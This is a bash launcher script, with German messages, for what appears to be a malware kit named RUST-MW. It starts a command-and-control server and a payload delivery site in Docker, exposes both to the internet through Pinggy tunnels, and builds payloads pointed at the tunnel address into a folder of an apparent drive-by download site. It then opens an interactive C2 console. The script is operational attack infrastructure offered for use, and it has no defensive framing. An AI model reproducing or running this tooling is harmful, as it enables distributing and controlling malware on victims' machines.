#!/bin/bash

# ==========================================
#  Docker Start Script
# ==========================================

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }

cd "$ROOT_DIR"

show_help() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           RUST-MW DOCKER COMMANDS                          ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo "Verwendung: $0 <command>"
    echo ""
    echo "Commands:"
    echo "  start       - Startet C2, Delivery und Pinggy Tunnels"
    echo "  c2          - Öffnet interaktive C2-Konsole"
    echo "  build       - Baut Payloads (erfordert HOST und PORT)"
    echo "  logs        - Zeigt alle Logs"
    echo "  stop        - Stoppt alle Container"
    echo "  status      - Zeigt Container-Status"
    echo ""
    echo "Workflow:"
    echo "  1. ./docker_start.sh start     # Services starten"
    echo "  2. Warte auf Pinggy URLs in den Logs"
    echo "  3. ./docker_start.sh build <HOST> <PORT>  # Payloads bauen"
    echo "  4. ./docker_start.sh c2        # C2 Konsole öffnen"
    echo ""
}

case "${1:-help}" in
    start)
        print_status "Starte alle Services..."
        docker compose up -d
        echo ""
        print_success "Services gestartet!"
        echo ""
        print_warning "Warte 10 Sekunden auf Pinggy URLs..."
        sleep 10
        echo ""
        echo -e "${CYAN}=== PINGGY TUNNEL URLs ===${NC}"
        docker compose logs pinggy-c2 2>&1 | grep -E "tcp://|https://" | tail -2
        docker compose logs pinggy-delivery 2>&1 | grep -E "tcp://|https://" | tail -2
        echo ""
        print_status "Nutze './docker_start.sh c2' für die C2-Konsole"
        print_status "Nutze './docker_start.sh logs' für alle Logs"
        ;;
    
    c2)
        # Prüfe ob Container läuft, sonst starte ihn
        if ! docker ps | grep -q c2-server; then
            print_warning "C2-Server nicht aktiv, starte ihn..."
            docker compose up -d c2-server
            sleep 2
        fi
        print_status "Verbinde zur C2-Konsole..."
        print_warning "Zum Beenden: Ctrl+P, dann Ctrl+Q (hält Server am Leben)"
        print_warning "Oder 'exit' eingeben"
        echo ""
        docker attach c2-server
        ;;
    
    build)
        if [ -z "$2" ] || [ -z "$3" ]; then
            echo "Usage: $0 build <HOST> <PORT>"
            echo ""
            echo "Beispiel: $0 build abc-123.a.free.pinggy.link 12345"
            echo ""
            echo "Hole die Werte aus den Pinggy-Logs:"
            docker compose logs pinggy-c2 2>&1 | grep -E "tcp://" | tail -1
            exit 1
        fi
        
        print_status "Baue Payloads für $2:$3..."
        C2_HOST="$2" C2_PORT="$3" docker compose --profile build run --rm builder
        print_success "Payloads gebaut! Siehe: delivery/DbD-Site/files/"
        ;;
    
    logs)
        docker compose logs -f
        ;;
    
    logs-c2)
        docker compose logs -f pinggy-c2
        ;;
    
    logs-delivery)
        docker compose logs -f pinggy-delivery
        ;;
    
    stop)
        print_status "Stoppe alle Container..."
        docker compose down
        print_success "Gestoppt!"
        ;;
    
    status)
        docker compose ps
        ;;
    
    urls)
        echo -e "${CYAN}=== PINGGY TUNNEL URLs ===${NC}"
        echo ""
        echo -e "${GREEN}C2 Tunnel:${NC}"
        docker compose logs pinggy-c2 2>&1 | grep -E "tcp://[a-zA-Z0-9.-]+:[0-9]+" | tail -1
        echo ""
        echo -e "${GREEN}Delivery Tunnel:${NC}"
        docker compose logs pinggy-delivery 2>&1 | grep -E "https://[a-zA-Z0-9.-]+" | tail -1
        ;;
    
    help|*)
        show_help
        ;;
esac
